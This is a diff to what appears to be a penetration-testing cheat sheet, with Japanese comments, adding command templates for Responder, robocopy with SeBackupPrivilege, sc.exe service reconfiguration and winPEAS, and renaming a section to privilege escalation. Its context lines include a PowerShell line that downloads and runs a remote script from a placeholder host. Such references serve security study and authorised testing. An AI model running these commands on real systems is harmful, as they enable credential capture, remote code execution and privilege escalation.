@@ -421,6 +421,10 @@ openssl pkcs12 -in 'PFX' -nocerts -out privkey.pem -nodes
 ```sh
 puttygen 'PUTTY_PRIVATEKEY' -O private-openssh -o 'OUTPUT_PRIVATEKEY'
 ```
+- responder
+```sh
+sudo responder -I 'INTERFACE' -v
+```
 - username-anarchy
 ```sh
 ./username-anarchy -i userlist.txt > user.txt
@@ -430,7 +434,7 @@ puttygen 'PUTTY_PRIVATEKEY' -O private-openssh -o 'OUTPUT_PRIVATEKEY'
 ## windows
 - [AdSyncDecrypt](https://github.com/VbScrub/AdSyncDecrypt) ![GitHub Repo stars](https://img.shields.io/github/stars/VbScrub/AdSyncDecrypt?style=social)
 - cmd
-```bat
+```powershell
 # execute 64bit process on 32bit process
 C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe
 ```
@@ -447,13 +451,28 @@ Get-LAPSComputers
 [Environment]::Is64BitProcess
 IEX(new-object net.webclient).downloadstring('http://IP/.ps1')
 ```
+- robocopy
+```powershell
+# SeBackupPrivilege
+robocopy 'SOURCE DIRECTORY' 'DEST DIRECTORY' 'SOURCE FILE' /B /NFL /NDL /NJH /NJS
+```
+- sc.exe
+```powershell
+sc.exe query 'SERVICENAME'
+sc.exe start 'SERVICENAME'
+sc.exe stop 'SERVICENAME'
+sc.exe config 'SERVICENAME' binPath='COMMAND'
+```
 - winpeas ![GitHub Repo stars](https://img.shields.io/github/stars/peass-ng/PEASS-ng?style=social)
-```bat
+```powershell
 # 32bit or 64bit のバージョンに注意
 .\winPEASx64.exe userinfo quiet
 .\winPEASx64.exe systeminfo quiet
+.\winPEASx64.exe servicesinfo quiet
 ```
-### exploit
+
+
+## PrivEsc
 #### windows
 - [MS08-066](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS08-066)
 - [CVE-2009-0079](https://github.com/Re4son/Churrasco/)
